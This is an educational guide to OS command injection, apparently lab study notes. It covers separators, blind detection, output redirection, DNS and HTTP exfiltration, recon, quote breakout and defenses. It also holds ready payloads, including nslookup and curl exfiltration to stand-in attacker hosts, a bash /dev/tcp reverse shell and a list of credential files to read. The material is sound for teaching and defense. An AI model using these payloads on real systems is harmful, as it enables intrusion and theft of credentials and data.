# OS Command Injection 

## Table of Contents

1. [What is OS Command Injection?](#1-what-is-os-command-injection)
2. [How It Works — The Root Cause](#2-how-it-works--the-root-cause)
3. [Command Separators & Shell Metacharacters](#3-command-separators--shell-metacharacters)
4. [Types of OS Command Injection](#4-types-of-os-command-injection)
   - 4.1 [In-Band (Visible Output)](#41-in-band-visible-output)
   - 4.2 [Blind — Time Delay Detection](#42-blind--time-delay-detection)
   - 4.3 [Blind — Output Redirection](#43-blind--output-redirection)
   - 4.4 [Blind — Out-of-Band (OAST)](#44-blind--out-of-band-oast)
5. [Reconnaissance Commands](#5-reconnaissance-commands)
6. [Injection Inside Quoted Contexts](#6-injection-inside-quoted-contexts)
7. [Impact Assessment](#7-impact-assessment)
8. [Defense & Prevention](#8-defense--prevention)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. What is OS Command Injection?

OS command injection (also called **shell injection**) is a vulnerability where an attacker can inject arbitrary operating system commands into a call that the application makes to the underlying shell. The injected commands run with the **same privileges as the application process** — often a web server user — but can quickly escalate from there.

### Why It's Severe

- **Full server compromise** — read files, write files, execute binaries
- **Lateral movement** — pivot to other internal systems by exploiting trust relationships
- **Persistence** — install backdoors, cron jobs, reverse shells
- **Data exfiltration** — dump databases, read credentials, steal private keys

Unlike many injection vulnerabilities that are constrained to one layer (e.g., SQL injection stays in the DB layer), command injection gives direct access to the **OS level** — the most powerful layer of the stack.

---

## 2. How It Works — The Root Cause

The vulnerability exists when an application **passes user-controlled input directly into a shell command** without sanitizing it.

### Vulnerable Pattern

```
User input  →  String concatenation  →  Shell execution
```

**Example — Stock check application:**

The server calls a legacy Perl script like this:
```
stockreport.pl <productID> <storeID>
```

Normal request: `productID=381&storeID=29`
Resulting command:
```bash
stockreport.pl 381 29
```

Injected request: `productID=381&storeID=29|whoami`
Resulting command:
```bash
stockreport.pl 381 29|whoami
```

The shell interprets `|` as a pipe — now `whoami` executes.

### What Actually Happens

The application hands the constructed string to a shell interpreter (e.g., `/bin/sh`, `cmd.exe`). The shell doesn't distinguish between the developer's intended command and the attacker's injected command — it executes **everything** according to its parsing rules. This is why the attack works: the shell is doing exactly what it's designed to do.

---

## 3. Command Separators & Shell Metacharacters

Shell metacharacters are the backbone of command injection. Each one has distinct behavior that determines when and how it's useful.

### Cross-Platform Separators (Linux + Windows)

| Character | Behavior | Example |
|-----------|----------|---------|
| `&` | Run both commands (background first) | `cmd1 & cmd2` — both run, cmd1 in background |
| `&&` | Run second only if first succeeds | `cmd1 && cmd2` — cmd2 only if cmd1 exits 0 |
| `\|` | Pipe stdout of first into second | `cmd1 \| cmd2` — output of cmd1 becomes input of cmd2 |
| `\|\|` | Run second only if first fails | `cmd1 \|\| cmd2` — cmd2 only if cmd1 fails |

### Unix-Only Separators

| Character | Behavior |
|-----------|----------|
| `;` | Run both commands sequentially, regardless of exit code |
| `\n` (newline, `0x0a`) | Acts as command terminator — works like `;` in most shells |

### Inline Execution (Unix Only)

These allow injecting a command **inside** another command's arguments — the shell executes the inner command first and substitutes its output:

| Syntax | Example | Result |
|--------|---------|--------|
| `` `command` `` | `` `whoami` `` | Replaced by output of `whoami` |
| `$(command)` | `$(whoami)` | Same — more nesting-friendly |

**Practical use in injection:**
```bash
# Exfiltrate data via DNS — inner command output becomes part of the hostname
nslookup `whoami`.attacker.com
# → resolves: root.attacker.com (visible in DNS logs)
```

### Choosing the Right Separator

- `&` after your payload separates the injection point from whatever comes after — the trailing application argument becomes its own (failing) command and doesn't interfere with your injection.
- `||` is clean for blind injection: the original command fails, yours runs.
- `;` is simplest on Unix when you're certain it's a Unix target.
- **When in doubt, try all of them** — different server configurations reject different characters.

---

## 4. Types of OS Command Injection

### 4.1 In-Band (Visible Output)

**What it is:** The output of the injected command is returned directly in the HTTP response. This is the easiest class to detect and confirm.

**How it works:**

The application takes user input, passes it to a shell, and sends the shell output back to the user (or includes it in the response). By injecting a command, your output gets embedded alongside (or instead of) the normal output.

**Example:**

Injecting `& echo aiwefwlguh &` into the `productID` parameter produces this in the response:
```
Error - productID was not provided
aiwefwlguh                          ← your injected echo output
29: command not found
```

The three lines reveal:
- The original script ran without its expected argument (your injection broke the syntax)
- Your `echo` ran and returned output
- The trailing argument `29` was interpreted as a command (failed)

**Test payload:** `echo` with a unique, recognizable string is the safest first probe — no side effects, clearly confirms execution if output appears.

**Practical approach:**
```
1|whoami         → replaces storeID, pipes output of whoami through
& whoami &       → runs whoami between two separators
; whoami         → runs whoami after original command (Unix)
```

---

### 4.2 Blind — Time Delay Detection

**What it is:** The application executes your command but **does not return its output** in the response. You infer execution by measuring how long the response takes.

**Why ping works perfectly for this:**

The `ping` command with `-c N` sends exactly N ICMP packets, one per second. This gives you **deterministic, controlled delay**:

```bash
ping -c 10 127.0.0.1   # causes exactly ~10 seconds of delay
```

**Injected payload:**
```
x||ping+-c+10+127.0.0.1||
```

If the response takes ~10 seconds instead of the normal ~200ms → command injection confirmed.

**Why this is reliable:**
- `ping` is almost universally available on both Linux and Windows
- The delay is consistent and measurable (not dependent on network fluctuation)
- You're pinging loopback — no external dependency
- Adjust `-c` (Linux) or `-n` (Windows: `ping -n 10 127.0.0.1`) to control duration

**Key point:** Time delay only **confirms** injection exists. It doesn't extract any data. Use it as the first probe when output isn't visible, then move to output redirection or OAST for data extraction.

---

### 4.3 Blind — Output Redirection

**What it is:** You redirect the output of your injected command into a **file on the web server's static file system**, then fetch that file via HTTP.

**Requirements:**
- You need to know (or guess) a **writable directory** that is also **web-accessible**
- The web server process must have **write permission** to that directory

**Common writable + web-accessible paths:**

| App Stack | Typical Static Path |
|-----------|---------------------|
| Apache/Nginx on Linux | `/var/www/html/`, `/var/www/static/` |
| PHP apps | `/var/www/html/images/`, `/uploads/` |
| Generic | Any directory that serves files the app already loads |

**Payload structure:**
```bash
||whoami>/var/www/images/output.txt||
```

After injecting:
```
1. Injected command runs: whoami → writes to file
2. You fetch: GET /images/output.txt
3. File contains: www-data  (or whatever the server user is)
```

**Practical tip — find the right path:**
Look at how the app loads its own resources. If it loads product images via `GET /images/product1.jpg`, the image directory is web-accessible. Redirect output there.

**Chaining — fetch the file using another injectable parameter:**

In the output redirection lab, the `filename` parameter of the image loader is also controllable:
```
GET /image?filename=output.txt
```
This lets you trigger the injection in one request and read the output in another — no need to directly browse to the file.

---

### 4.4 Blind — Out-of-Band (OAST)

**What it is:** You inject a command that causes the server to make an **outbound network request to a server you control**. You observe the request to confirm execution — and can embed command output in the request itself (DNS subdomain, HTTP parameter, etc.).

**Why OAST is powerful:**
- Works even when output isn't visible AND the file system isn't writable
- Works even when the injection is asynchronous (background threads, queued jobs)
- DNS is almost never blocked outbound (unlike HTTP to attacker IPs)
- Data exfiltration is cleaner — no need for writable directories

#### Step 1: Confirm Injection via DNS Lookup

```bash
& nslookup YOUR-COLLABORATOR-DOMAIN &
```

If a DNS query arrives at your Burp Collaborator listener → the command executed. The server's DNS resolution proves it.

#### Step 2: Exfiltrate Data via DNS

Embed command output **inside the DNS hostname** using inline execution:

```bash
& nslookup `whoami`.YOUR-COLLABORATOR-DOMAIN &
```

Shell execution order:
1. `` `whoami` `` executes first → returns e.g. `www-data`
2. String becomes: `nslookup www-data.YOUR-COLLABORATOR-DOMAIN`
3. Server performs DNS lookup for `www-data.YOUR-COLLABORATOR-DOMAIN`
4. Burp Collaborator records the lookup — you see `www-data` in the subdomain

**DNS as an exfil channel works because:**
- DNS queries are logged with the full queried hostname
- Subdomains are arbitrary — you can put any string there
- Even firewalled servers almost always resolve DNS outbound

#### Dollar-sign variant (more portable):
```bash
& nslookup $(whoami).YOUR-COLLABORATOR-DOMAIN &
```

**Burp Collaborator workflow:**
1. Open Collaborator tab in Burp → copy unique subdomain
2. Inject payload with subdomain embedded
3. Click "Poll now" in Collaborator tab
4. See DNS interactions — full queried hostname shown in Description tab

**OAST for HTTP exfiltration (when DNS is filtered):**
```bash
& curl http://YOUR-SERVER/$(whoami) &
# or
& wget http://YOUR-SERVER/?data=$(cat /etc/passwd) &
```

---

## 5. Reconnaissance Commands

Once injection is confirmed, run these to understand the environment before going deeper.

### Standard Recon Commands

| Goal | Linux | Windows |
|------|-------|---------|
| Current user | `whoami` | `whoami` |
| Full OS info | `uname -a` | `ver` |
| Hostname | `hostname` | `hostname` |
| Network interfaces | `ifconfig` or `ip a` | `ipconfig /all` |
| Active connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |
| Current directory | `pwd` | `cd` |
| Directory listing | `ls -la` | `dir` |
| Read a file | `cat /etc/passwd` | `type C:\Windows\System32\drivers\etc\hosts` |
| Find SUID binaries | `find / -perm -4000 2>/dev/null` | N/A |
| Environment variables | `env` | `set` |
| Sudo permissions | `sudo -l` | N/A |

### High-Value Files to Read (Linux)

```
/etc/passwd           → user accounts
/etc/shadow           → hashed passwords (requires root)
/etc/hosts            → internal hostnames and IPs
~/.ssh/id_rsa         → private SSH keys
/var/www/html/config  → app config (DB credentials)
/proc/version         → kernel version
/proc/net/tcp         → open TCP connections (raw)
```

### Pivoting Recon

After reading `/etc/hosts` and `ifconfig`, identify internal IP ranges. Use `ping` sweeps or `curl` to probe internal services that aren't exposed externally.

---

## 6. Injection Inside Quoted Contexts

Sometimes user input is wrapped in quotes inside the shell command:

```bash
stockreport.pl "381" "29"
#               ↑↑↑   ↑↑
#           quoted   quoted
```

If you inject `& whoami &`, it becomes:
```bash
stockreport.pl "381" "& whoami &"
```

The shell treats everything inside double quotes as a literal string — your separator is ignored.

### Breaking Out of Quotes

You must close the quote first before your separator takes effect:

**Double-quoted context:**
```
" & whoami & "
```
Becomes: `stockreport.pl "381" "" & whoami & ""`
- First `"` closes the original quote
- `& whoami &` runs as a command
- Trailing `"` starts a new (invalid) string literal — usually harmless

**Single-quoted context:**
```
' ; whoami ; '
```

**Inline execution inside quotes (Unix)** — this is why `$()` and backticks are special:
```bash
echo "Hello `whoami`"
# → Hello www-data
```
Inline execution works **inside** double quotes. So even without breaking out:
```
"`whoami`"
```
Would cause `whoami` to execute and its result to be embedded.

**Practical rule:** Always try both quote-breaking variants AND inline execution when facing a quoted context.

---

## 7. Impact Assessment

| Factor | Low Impact | High Impact |
|--------|-----------|------------|
| **Server privileges** | Restricted app user | Root / SYSTEM |
| **Network access** | Internet-only server | Internal network access |
| **Data on server** | No sensitive data | DB credentials, private keys, PII |
| **Output visibility** | Blind only | Full in-band output |
| **Outbound filtering** | Strict egress rules | DNS/HTTP freely outbound |

### Escalation Path

```
Command Injection
       │
       ├── Read /etc/passwd, /etc/shadow → crack hashes offline
       ├── Read app config files → DB credentials → full DB dump
       ├── Read ~/.ssh/id_rsa → SSH into server directly
       ├── Write to cron jobs / ~/.bashrc → persistence
       ├── Reverse shell → interactive session
       └── Internal network recon → pivot to other systems
```

### Spawning a Reverse Shell

Once injection is confirmed, a reverse shell turns blind injection into interactive access:

```bash
# Attacker machine: listen first
nc -lvnp 4444

# Injected payload (bash reverse shell):
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1

# URL-encoded for GET parameter injection:
bash+-i+>%26+/dev/tcp/ATTACKER-IP/4444+0>%261
```

---

## 8. Defense & Prevention

### Rule #1 — Never Call OS Commands with User Input

The most effective fix is architectural: **replace shell calls with native library calls**.

| Shell Command Being Used | Safe Replacement |
|--------------------------|-----------------|
| `mail -s "..." addr` | Language's built-in SMTP library |
| `convert image.jpg ...` | ImageMagick PHP/Python library bindings |
| `zip file.zip ...` | Native zip library |
| `curl http://...` | HTTP client library (requests, urllib, etc.) |

If a shell call can be replaced, replace it — this eliminates the attack surface entirely.

### Rule #2 — Strict Allowlist Validation (If Shell Calls Are Unavoidable)

Validate input before it reaches the shell. Accept only what you explicitly know is safe:

```python
import re

def validate_product_id(product_id):
    # Only allow positive integers
    if not re.fullmatch(r'\d+', product_id):
        raise ValueError("Invalid productID")
    return product_id
```

**Types of allowlist validation:**
- **Numeric check** — if the parameter should be a number, only accept digits
- **Alphanumeric only** — reject anything with shell metacharacters
- **Enum/whitelist** — if only 5 valid store IDs exist, reject everything else

### Rule #3 — Never Try to Escape Shell Metacharacters

Escaping shell metacharacters (e.g., trying to sanitize `&`, `|`, `;`) is a **blacklist approach** and always fails eventually:

- Different shell parsers have different escaping rules
- URL encoding, double encoding, Unicode tricks bypass naive blacklists
- New metacharacters are discovered regularly
- Context-dependent escaping (inside quotes, inside `$()`) is extremely complex

**Escaping is not a defense — it is a false sense of security.**

### Rule #4 — Use Parameterized Command APIs When Available

Some languages offer shell execution APIs that separate the command from its arguments — preventing the shell from interpreting arguments as syntax:

```python
# VULNERABLE: string interpolation into shell
import subprocess
subprocess.run(f"stockreport.pl {product_id} {store_id}", shell=True)

# SAFE: arguments passed as list — shell never parses them
subprocess.run(["stockreport.pl", product_id, store_id])
# Even if product_id = "381 & whoami", it is passed literally as one argument
```

The key difference: `shell=True` passes the whole string to `/bin/sh -c "..."`. Without it, Python passes arguments directly to the process — no shell involved.

### Rule #5 — Principle of Least Privilege

Run the application as a low-privilege user:
- Dedicated service account with no home directory
- No sudo access
- No write access outside the app directory
- Egress firewall rules to block outbound DNS/HTTP to unknown hosts

This doesn't prevent command injection, but **severely limits what an attacker can do with it**.

---

## 9. Quick Reference Cheat Sheet

### Detection Payloads (Try These First)

```bash
# In-band confirmation
& echo vulnerable &
; echo vulnerable
| echo vulnerable
|| echo vulnerable

# Time-based (blind) — 10 second delay
& ping -c 10 127.0.0.1 &          # Linux
& ping -n 10 127.0.0.1 &          # Windows
|| ping -c 10 127.0.0.1 ||        # cleaner if original command fails

# OOB confirmation (replace with your Collaborator domain)
& nslookup YOUR.COLLABORATOR.DOMAIN &
|| nslookup YOUR.COLLABORATOR.DOMAIN ||
```

### Data Exfiltration Payloads

```bash
# Output redirection (requires writable web root)
|| whoami > /var/www/html/out.txt ||
|| cat /etc/passwd > /var/www/images/out.txt ||

# DNS exfiltration (embed output in subdomain)
& nslookup `whoami`.YOUR.COLLABORATOR.DOMAIN &
& nslookup $(cat /etc/passwd | head -1 | base64).YOUR.COLLABORATOR.DOMAIN &

# HTTP exfiltration
& curl http://YOUR-SERVER/?x=$(whoami) &
& wget -q -O- http://YOUR-SERVER/$(cat /etc/hostname) &
```

### Separator Selection Guide

```
Goal: run injection on Unix, don't care if original command fails
→ Use: || or ;

Goal: run injection AND original command
→ Use: &  or  ;

Goal: Windows + Unix compatible
→ Use: &  ||  |  &&

Goal: embed output inside another command's argument
→ Use: `command`  or  $(command)

Goal: break out of a quoted context first
→ Use: "  or  '  before your separator
```

### Common Injection Points to Test

| Parameter Type | Why It's Risky |
|---------------|----------------|
| File names | Often passed to `ls`, `cat`, `cp` |
| Search fields | May pass to `grep`, `find` |
| Email fields | May pass to `mail` or `sendmail` |
| IP/hostname fields | May pass to `ping`, `nslookup`, `curl` |
| Product/store IDs | May be args to legacy scripts |
| Image processing fields | May pass to `convert`, `ffmpeg` |
| Archive/zip operations | May pass to `zip`, `tar` |

---
